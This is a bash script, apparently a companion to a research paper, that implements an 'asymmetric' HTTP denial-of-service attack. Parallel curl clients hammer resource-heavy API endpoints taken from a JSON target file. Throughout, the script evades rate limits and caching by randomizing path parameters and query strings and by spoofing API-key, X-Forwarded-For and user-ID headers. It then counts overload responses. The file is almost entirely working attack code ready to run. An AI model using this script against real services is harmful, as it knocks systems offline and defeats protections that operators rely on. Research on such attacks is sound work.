#!/usr/bin/env bash
# -----------------------------------------------------------------------------
# Algorithm 4 — Asymmetric HTTP/1.1 Attack (CURL variant).
#
# Each request iterates over *all* heavy targets, picking one at random and
# mutating its path parameters and query string so consecutive requests are
# unique — the bypass technique described in §II.D of the paper.
#
# Usage:
#   ./algorithm4_asymmetric.sh <targets.json> [requests_per_client] [clients]
# -----------------------------------------------------------------------------
set -u
export LC_ALL=C

if [[ $# -lt 1 ]]; then
    echo "usage: $0 <targets.json> [requests_per_client=2000] [clients=15]" >&2
    exit 2
fi

TARGETS_JSON="$1"
REQUESTS="${2:-2000}"
CLIENTS="${3:-15}"

command -v jq >/dev/null || { echo "jq required" >&2; exit 1; }
command -v curl >/dev/null || { echo "curl required" >&2; exit 1; }

BASE_URL="$(jq -r '.base_url' "$TARGETS_JSON")"
mapfile -t METHODS < <(jq -r '.target_list[].method' "$TARGETS_JSON")
mapfile -t PATHS   < <(jq -r '.target_list[].path'   "$TARGETS_JSON")
N=${#PATHS[@]}

if [[ "$BASE_URL" == "null" || $N -eq 0 ]]; then
    echo "[!] could not read base_url / target_list from $TARGETS_JSON" >&2
    exit 1
fi

OUT_DIR="$(dirname "$TARGETS_JSON")"
TS="$(date +%s)"
LOG="${OUT_DIR}/asymmetric_curl_${TS}.csv"
echo "worker,iteration,epoch,method,path,status,latency_ms" > "$LOG"

echo "[+] asymmetric curl attack | targets=${N} | clients=${CLIENTS} | reqs/c=${REQUESTS}" >&2
echo "[+] log: ${LOG}" >&2

rand_key()  { local p=(AX001- BX001- CC001- ZZ000-)
              local s=$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom|head -c 8)
              printf "%s%s" "${p[$RANDOM%4]}" "$s"; }
rand_xff()  { printf "10.%d.%d.%d" $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%254+1)); }
rand_user() { local s=$(LC_ALL=C tr -dc 'a-z0-9' </dev/urandom|head -c 6)
              printf "u-%s" "$s"; }
rand_noise(){ LC_ALL=C tr -dc 'a-z0-9' </dev/urandom|head -c 4; }
mutate_path() {
    local p="$1"
    p=$(echo "$p" | sed -E 's/\{[^}]+\}/'"$((RANDOM%9999))"'/g')
    local sep="?"; [[ "$p" == *\?* ]] && sep="&"
    printf "%s%s_n=%s" "$p" "$sep" "$(rand_noise)"
}

worker() {
    local id="$1"
    local i
    for (( i = 0; i < REQUESTS; i++ )); do
        local idx=$(( RANDOM % N ))
        local m="${METHODS[$idx]}"
        local p; p=$(mutate_path "${PATHS[$idx]}")
        local key xff usr
        key=$(rand_key); xff=$(rand_xff); usr=$(rand_user)
        local body='{}'
        if [[ "$m" != "GET" ]]; then
            body=$(printf '{"k":"%s","v":%d}' "$(rand_noise)" "$RANDOM")
        fi
        local out
        out=$(curl --silent --output /dev/null \
                    --write-out '%{http_code};%{time_total}' \
                    --max-time 15 \
                    -X "${m}" \
                    -H "X-API-KEY: ${key}" \
                    -H "X-Forwarded-For: ${xff}" \
                    -H "X-User-Id: ${usr}" \
                    -H "User-Agent: Algo4-Asym-CURL/${id}" \
                    -H "Accept: application/json" \
                    -H "Content-Type: application/json" \
                    --data "${body}" \
                    "${BASE_URL}${p}" 2>/dev/null) || out="000;0"
        local status="${out%%;*}"
        local ms; ms=$(awk -v t="${out##*;}" 'BEGIN{printf "%.2f", t*1000}')
        # CSV-escape the path
        printf "%d,%d,%d,%s,%s,%s,%s\n" "$id" "$i" "$(date +%s)" \
                "$m" "${p//,/%2C}" "$status" "$ms" >> "$LOG"
    done
}

t0=$(date +%s)
for (( c = 0; c < CLIENTS; c++ )); do
    worker "$c" &
done
wait
t1=$(date +%s)

echo "[+] done in $(( t1 - t0 ))s | CSV: ${LOG}" >&2

awk -F, 'NR>1 {
    if ($6 ~ /^2/) two++
    else if ($6 ~ /^4/) four++
    else if ($6 ~ /^5/) five++
    if ($6=="429" || $6=="503" || $6=="509" || $6=="520") ovr++
    if ($6!="000") {sum+=$7; n++}
}
END {
    printf "2xx=%d 4xx=%d 5xx=%d overload=%d avg_ms=%.2f\n",
        two, four, five, ovr, (n? sum/n : 0)
}' "$LOG" >&2
